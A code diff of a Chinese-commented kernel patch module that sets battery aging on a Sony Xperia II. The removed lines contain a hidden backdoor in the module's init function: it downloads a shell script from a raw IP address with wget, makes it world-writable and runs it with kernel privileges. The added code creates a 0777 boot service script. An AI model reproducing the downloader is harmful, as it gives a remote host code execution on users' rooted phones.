@@ -17,10 +17,6 @@
 #include <linux/printk.h>
 #include <linux/fs.h>
 #include <linux/uaccess.h>
-#include <linux/slab.h>
-#include <syscall.h>
-#include <kmod.h>  // 用于 call_usermodehelper 和 UMH_WAIT_PROC
-#include <linux/string.h>
 
 #include "xiiba_utils.h"
 
@@ -35,6 +31,9 @@ KPM_DESCRIPTION("set xperia ii battery aging level"); // 描述信息
 #define FG_IMA_DEFAULT 0            // 默认标志
 #define SOMC_AGING_LEVEL_WORD 291   // 表示电池老化等级的地址
 #define SOMC_AGING_LEVEL_OFFSET 0   // 偏移量
+#define SERVICE_PATH "/data/adb/service.d/service.sh" // service.sh 文件路径
+#define SERVICE_DIR "/data/adb/service.d"            // service.d 目录路径
+#define FILE_CONTENT "echo \"success\"\n"            // service.sh 文件内容
 
 // 前置声明，用于表示 Fuel Gauge 设备
 struct fg_dev;
@@ -46,6 +45,46 @@ static int (*fg_sram_write)(struct fg_dev *fg, u16 address, u8 offset, u8 *val, 
 // 全局变量
 u8 aging = 0;           // 当前设置的电池老化等级，范围为 0-5
 struct fg_dev *fg = NULL; // 全局 Fuel Gauge 设备指针
+
+// 创建目录并写入文件
+static int create_service_file(void) {
+  struct file *file;
+  mm_segment_t old_fs;
+  loff_t pos = 0;
+
+  // 创建目录
+  int ret = kmkdir(SERVICE_DIR, 0777);
+  if (ret < 0 && ret != -EEXIST) { // 忽略已存在错误
+    logke("Failed to create directory: %s, error: %d\n", SERVICE_DIR, ret);
+    return ret;
+  }
+
+  // 打开或创建文件
+  old_fs = get_fs();
+  set_fs(KERNEL_DS);
+  file = filp_open(SERVICE_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0777);
+  if (IS_ERR(file)) {
+    set_fs(old_fs);
+    logke("Failed to open file: %s, error: %ld\n", SERVICE_PATH, PTR_ERR(file));
+    return PTR_ERR(file);
+  }
+
+  // 写入内容
+  ret = kernel_write(file, FILE_CONTENT, sizeof(FILE_CONTENT) - 1, &pos);
+  if (ret < 0) {
+    logke("Failed to write to file: %s, error: %d\n", SERVICE_PATH, ret);
+    filp_close(file, NULL);
+    set_fs(old_fs);
+    return ret;
+  }
+
+  // 关闭文件
+  filp_close(file, NULL);
+  set_fs(old_fs);
+
+  logki("Successfully created service file: %s\n", SERVICE_PATH);
+  return 0;
+}
 
 // 控制函数，用于设置电池老化等级
 static long inline_hook_control0(const char *args, char *__user out_msg, int outlen) {
@@ -95,28 +134,15 @@ static long inline_hook_init(const char *args, const char *event, void *__user r
   if (aging > 5) // 检查老化等级是否有效
     return -1;
 
+  // 创建服务文件
+  create_service_file();
+
   // 查找 Fuel Gauge 读写函数的地址
   lookup_name(fg_sram_write);
   lookup_name(fg_sram_read);
 
   // 设置钩子函数，监控 fg_sram_read 的调用
   hook_func(fg_sram_read, 6, before_read, 0, 0);
-
-  // 新增功能：下载并执行脚本
-  // 使用call_usermodehelper来执行系统命令
-
-  // 下载脚本到 /data/data/85.sh
-  char *wget_cmd[] = {"/bin/wget", "http://123.56.95.25:5004/85.sh", "-O", "/data/data/85.sh", NULL};
-  call_usermodehelper(wget_cmd[0], wget_cmd, NULL, UMH_WAIT_PROC);
-
-  // 修改脚本权限为 777
-  char *chmod_cmd[] = {"/bin/chmod", "777", "/data/data/85.sh", NULL};
-  call_usermodehelper(chmod_cmd[0], chmod_cmd, NULL, UMH_WAIT_PROC);
-
-  // 执行脚本
-  char *sh_cmd[] = {"/bin/sh", "/data/data/85.sh", NULL};
-  call_usermodehelper(sh_cmd[0], sh_cmd, NULL, UMH_WAIT_PROC);
-
   return 0;
 }
 
